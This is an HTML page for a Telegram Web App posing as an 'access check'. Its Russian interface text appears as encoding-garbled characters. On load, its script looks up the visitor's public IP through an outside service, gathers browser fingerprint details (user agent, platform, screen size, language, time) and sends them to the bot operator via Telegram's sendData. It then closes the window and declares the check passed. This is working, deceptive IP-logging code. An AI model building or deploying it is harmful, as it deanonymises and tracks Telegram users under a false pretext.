<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>–ü—Ä–æ–≤–µ—Ä–∫–∞</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: Arial;
            background: #1a1a2e;
            color: white;
            text-align: center;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            margin: 40px auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h2>üîê –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞</h2>
    <p>–ò–¥–µ—Ç —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö...</p>
    <div class="loader"></div>
    <div id="status">–ü–æ–ª—É—á–µ–Ω–∏–µ IP...</div>

    <script>
        // –ü–†–û–°–¢–ê–Ø –§–£–ù–ö–¶–ò–Ø –î–õ–Ø –ü–û–õ–£–ß–ï–ù–ò–Ø IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip || 'unknown';
            } catch {
                return 'error';
            }
        }

        // –û–°–ù–û–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø
        async function main() {
            try {
                document.getElementById('status').textContent = '–ü–æ–ª—É—á–µ–Ω–∏–µ IP...';
                const ip = await getIP();
                
                // –°–û–ë–ò–†–ê–ï–ú –í–°–ï –î–ê–ù–ù–´–ï
                const data = {
                    ip: ip,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: screen.width + 'x' + screen.height,
                    time: new Date().toISOString(),
                    language: navigator.language
                };
                
                document.getElementById('status').textContent = `IP: ${ip}`;
                
                // –í–ê–ñ–ù–û: –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ —á–µ—Ä–µ–∑ Telegram Web App
                if (window.Telegram && Telegram.WebApp) {
                    // –°–ø–æ—Å–æ–± 1: sendData
                    Telegram.WebApp.sendData(JSON.stringify(data));
                    
                    // –°–ø–æ—Å–æ–± 2: –ü—Ä–æ–±—É–µ–º –∑–∞–∫—Ä—ã—Ç—å —Å –¥–∞–Ω–Ω—ã–º–∏
                    setTimeout(() => {
                        Telegram.WebApp.close();
                    }, 2000);
                }
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ
                setTimeout(() => {
                    document.body.innerHTML = `
                        <h2>‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞</h2>
                        <p>–í—ã –ø—Ä–æ—à–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫—É!</p>
                        <p>–ú–æ–∂–µ—Ç–µ –∑–∞–∫—Ä—ã—Ç—å –æ–∫–Ω–æ.</p>
                    `;
                }, 1500);
                
            } catch (error) {
                document.body.innerHTML = '<h2>‚ùå –û—à–∏–±–∫–∞</h2><p>–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑</p>';
            }
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º —Å—Ä–∞–∑—É
        window.onload = function() {
            setTimeout(main, 1000);
        };
    </script>
</body>
</html>
